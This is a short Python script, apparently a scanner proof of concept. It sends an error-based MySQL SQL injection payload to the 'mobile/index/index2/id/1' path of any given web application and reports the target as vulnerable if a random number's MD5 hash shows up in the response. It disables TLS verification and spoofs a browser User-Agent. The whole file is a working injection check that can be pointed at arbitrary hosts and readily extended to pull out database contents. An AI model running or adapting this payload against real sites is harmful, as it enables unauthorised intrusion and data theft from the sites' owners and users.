import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r=randomInt(800000000, 1000000000)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"mobile/index/index2/id/1) and (select 1 from (select count(*),concat(0x716b627671,(select md5("+str(r)+")),0x716b627671,floor(rand(0)*2))x from information_schema.tables group by x)a)--"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if md5(str(r).encode()).hexdigest() in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
